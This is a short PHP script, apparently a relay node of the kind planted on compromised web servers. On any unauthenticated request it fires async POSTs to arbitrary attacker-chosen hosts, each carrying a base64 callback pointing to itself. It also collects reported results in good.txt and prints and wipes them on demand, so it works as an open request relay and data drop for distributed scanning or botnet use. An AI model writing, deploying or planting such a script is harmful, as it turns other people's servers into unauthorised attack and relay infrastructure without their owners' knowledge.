<?php  
function curl_request_async($url, $params, $type='POST')
  {
      foreach ($params as $key => &$val) {
        if (is_array($val)) $val = implode(',', $val);
        $post_params[] = $key.'='.urlencode($val);
      }
      $post_string = implode('&', $post_params);

      $parts=parse_url($url);

      $fp = fsockopen($parts['host'],
          isset($parts['port'])?$parts['port']:80,
          $errno, $errstr, 30);

      // Data goes in the path for a GET request
      if('GET' == $type) $parts['path'] .= '?'.$post_string;

      $out = "$type ".$parts['path']." HTTP/1.1\r\n";
      $out.= "Host: ".$parts['host']."\r\n";
      $out.= "Content-Type: application/x-www-form-urlencoded\r\n";
      $out.= "Content-Length: ".strlen($post_string)."\r\n";
      $out.= "Connection: Close\r\n\r\n";
      // Data goes in the request body for a POST request
      if ('POST' == $type && isset($post_string)) $out.= $post_string;

      fwrite($fp, $out);
      fclose($fp);
  }
  
if (isset($_REQUEST['murl'])){

if (file_exists('good.txt')){
echo File_get_contents('good.txt');
file_put_contents('good.txt', '');
}

$arurl=$_REQUEST['murl'];
 foreach ($arurl as $urlsnd=>$urlthr) {  
$pst['urls']=$urlthr;
$pst['urlg']=base64_encode($_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']);
curl_request_async($urlsnd,$pst,'POST');

}
}

if (isset($_REQUEST['gl'])){
$good=base64_decode($_REQUEST['gl']);
file_put_contents('good.txt',$good."\n",FILE_APPEND);
}

?>